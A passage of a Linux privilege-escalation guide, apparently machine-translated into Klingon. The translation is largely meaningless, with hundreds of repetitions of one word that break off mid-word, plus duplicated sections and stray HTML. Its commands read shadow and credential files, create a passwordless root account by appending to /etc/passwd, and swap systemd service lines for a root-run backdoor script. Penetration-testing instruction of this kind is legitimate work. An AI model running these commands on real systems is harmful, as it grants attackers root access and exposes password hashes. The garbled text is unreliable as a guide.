Qapla'! jImejmeH 'ej 'oH /etc/ssh_config file 'e' vItlhutlh 'ej vItlhutlhbe'chugh, 'ej 'oH /etc/sshd_config file 'e' vItlhutlh 'ej vItlhutlhbe'chugh ssh-agent forwarding vItlhutlh 'e' vItlhutlhbe'chugh `AllowAgentForwarding` keyword (default 'oH vItlhutlh).

vaj Forward Agent configured 'e' vItlhutlhbe'chugh, **ghaH 'ejwI' 'e' vItlhutlhbe'chugh vItlhutlh** 'e' vItlhutlhbe'chugh:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interesting Files

### Profiles files

/etc/profile 'ej /etc/profile.d/ 'e' vItlhutlh 'ej 'oH **scripts 'e' vItlhutlhbe'chugh 'ejwI' 'e' vItlhutlhbe'chugh 'ejwI' 'e' vItlhutlhbe'chugh**. vaj, 'ejwI' 'e' vItlhutlhbe'chugh 'ejwI' 'e' vItlhutlhbe'chugh vItlhutlh.
```bash
ls -l /etc/profile /etc/profile.d/
```
**ghItlhvam** **profile script** **weird** **found** **qaStaHvIS** **check**.

### **Passwd/Shadow** **Files**

**OS** **depending** **/etc/passwd** **/etc/shadow** **files** **different name** **backup** **may be**. **Therefore** **recommended** **all of them** **find** **and** **check** **if you can read** **them** **to see** **if there are hashes** **inside the files**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
**tlhIngan Hol translation:**

QaghmeylIjDaq, `/etc/passwd` (yIH) (be'Hom) fileDaq **lojmItmey** vItlhutlh.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

First, generate a password with one of the following commands.

### tlhIngan Hol translation:

### /etc/passwd Daq QaD

QaD, vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh v
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
DaH jabbI'ID 'e' hacker 'ej jabbI'ID 'e' password 'e' jImej.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

You can now use the `su` command with `hacker:hacker`

Alternatively, you can use the following lines to add a dummy user without a password.\
WARNING: you might degrade the current security of the machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**ghItlh:** BSD platformvam `/etc/passwd` `/etc/pwd.db` 'ej `/etc/master.passwd` lo'laHbe', 'ej `/etc/shadow` 'ej `/etc/spwd.db` lo'laHbe'.

**tlhIngan Hol:** BSD platformvam `/etc/passwd` `/etc/pwd.db` 'ej `/etc/master.passwd` lo'laHbe', 'ej `/etc/shadow` 'ej `/etc/spwd.db` lo'laHbe'.

**HTML:** <b>ghItlh:</b> BSD platformvam <code>/etc/passwd</code> <code>/etc/pwd.db</code> 'ej <code>/etc/master.passwd</code> lo'laHbe', 'ej <code>/etc/shadow</code> 'ej <code>/etc/spwd.db</code> lo'laHbe'.<br><br>
<b>tlhIngan Hol:</b> BSD platformvam <code>/etc/passwd</code> <code>/etc/pwd.db</code> 'ej <code>/etc/master.passwd</code> lo'laHbe', 'ej <code>/etc/shadow</code> 'ej <code>/etc/spwd.db</code> lo'laHbe'.
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
**DaH jImej** vItlhutlh **tomcat** server **mach**. **'ej** **/etc/systemd/** **qarDaq** **Tomcat** **service configuration file** **modify** **'e'** **'ej** **vItlhutlh**. **vaj** **vItlhutlh** **lines** **modify** **'e'**:

```bash
ExecStart=/usr/local/tomcat/bin/startup.sh
ExecStop=/usr/local/tomcat/bin/shutdown.sh
```

**vaj** **vItlhutlh** **lines** **modify** **'e'**:

```bash
ExecStart=/usr/local/tomcat/bin/evil.sh
ExecStop=/usr/local/tomcat/bin/evil.sh
```

**vaj** **vItlhutlh** **lines** **modify** **'e'**:

```bash
ExecStart=/usr/local/tomcat/bin/startup.sh
ExecStop=/usr/local/tomcat/bin/evil.sh
```
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
**ghItlh**:
tomcat jatlhlaHbe'chugh **backdoor** vItlhutlh.

### **lo'laHbe'** pagh

**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** **lo'laHbe'** **ghItlh** **leak** **'ej** **qawHaq** **ghItlh** **'e'** **vItlhutlh**. **(vaj** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **vItlhutlh** **'e'** **v
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Qa'Hom/ghItlhpu' Daq

#### Introduction

When performing a privilege escalation on a Linux system, it is important to look for files that are located in unusual directories or are owned by non-standard users or groups. These files may provide valuable information or contain vulnerabilities that can be exploited to gain higher privileges.

#### Finding Weird Location/Owned Files

To identify these files, you can use the following techniques:

1. **Find files in unusual directories**: Look for files that are located in directories other than the standard system directories (/bin, /sbin, /usr/bin, etc.). Use the `find` command to search for files with specific ownership or permissions in non-standard directories.

   ```bash
   find / -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/run/*" ! -path "/tmp/*" ! -path "/var/tmp/*" ! -path "/var/run/*" ! -path "/var/lock/*" ! -path "/var/cache/*" ! -path "/var/log/*" ! -path "/home/*" ! -path "/root/*" ! -path "/mnt/*" ! -path "/media/*" ! -path "/srv/*" ! -path "/opt/*" ! -path "/etc/*" ! -path "/lib/*" ! -path "/lib64/*" ! -path "/usr/*" -user <username> -group <groupname>
   ```

   Replace `<username>` and `<groupname>` with the desired user and group names.

2. **Check for files owned by non-standard users or groups**: Use the `find` command to search for files owned by specific users or groups.

   ```bash
   find / -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" ! -path "/run/*" ! -path "/tmp/*" ! -path "/var/tmp/*" ! -path "/var/run/*" ! -path "/var/lock/*" ! -path "/var/cache/*" ! -path "/var/log/*" ! -path "/home/*" ! -path "/root/*" ! -path "/mnt/*" ! -path "/media/*" ! -path "/srv/*" ! -path "/opt/*" ! -path "/etc/*" ! -path "/lib/*" ! -path "/lib64/*" ! -path "/usr/*" -user <username>
   ```

   Replace `<username>` with the desired user name.

#### Conclusion

Identifying files in weird locations or owned by non-standard users or groups can be a crucial step in the privilege escalation process. These files may contain sensitive information or vulnerabilities that can be leveraged to gain higher privileges on a Linux system.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### cha'loghDI' DaH jatlh

The following command can be used to find the modified files in the last few minutes:

```bash
find / -type f -mmin -N
```

Replace `N` with the number of minutes you want to search for. This command will search for all files (`-type f`) in the entire file system (`/`) that have been modified within the last `N` minutes (`-mmin -N`).

This can be useful during a penetration test to identify recently modified files that may contain sensitive information or indicate a potential security vulnerability.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB files

#### Introduction

Sqlite is a popular database management system that is widely used in various applications. It is known for its simplicity, reliability, and efficiency. Sqlite databases are stored in files with the extension `.db` or `.sqlite`. These files contain structured data that can be accessed and manipulated using SQL queries.

#### Privilege Escalation

In some cases, an attacker may gain unauthorized access to a system and want to escalate their privileges to gain more control. Sqlite DB files can be a potential target for privilege escalation attacks. By exploiting vulnerabilities or misconfigurations in the system, an attacker can leverage the privileges associated with the Sqlite DB file to gain elevated access.

#### Techniques

There are several techniques that can be used to escalate privileges using Sqlite DB files. Some common techniques include:

1. **File Replacement**: An attacker can replace a legitimate Sqlite DB file with a malicious one that contains specially crafted SQL queries. When the application accesses the database, the attacker's code will be executed, allowing them to execute arbitrary commands with the privileges of the application.

2. **SQL Injection**: If an application uses user-supplied input in SQL queries without proper sanitization, an attacker can inject malicious SQL code into the queries. This can lead to privilege escalation if the application has elevated privileges when accessing the Sqlite DB file.

3. **Exploiting Vulnerabilities**: Sqlite itself may have vulnerabilities that can be exploited to escalate privileges. It is important to keep the Sqlite software up to date and apply patches to mitigate known vulnerabilities.

#### Mitigation

To mitigate the risk of privilege escalation through Sqlite DB files, consider the following measures:

1. **Secure File Permissions**: Ensure that the Sqlite DB files are only accessible by authorized users or processes. Restricting file permissions can help prevent unauthorized access and manipulation of the database.

2. **Input Sanitization**: Implement proper input sanitization techniques to prevent SQL injection attacks. Validate and sanitize user-supplied input before using it in SQL queries.

3. **Regular Updates**: Keep the Sqlite software up to date with the latest patches and security updates. This helps mitigate known vulnerabilities and reduces the risk of privilege escalation.

4. **Access Control**: Implement strong access control mechanisms to limit the privileges of applications or users accessing the Sqlite DB files. Only grant the necessary privileges required for the application to function properly.

By following these best practices, you can reduce the risk of privilege escalation through Sqlite DB files and enhance the security of your system.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

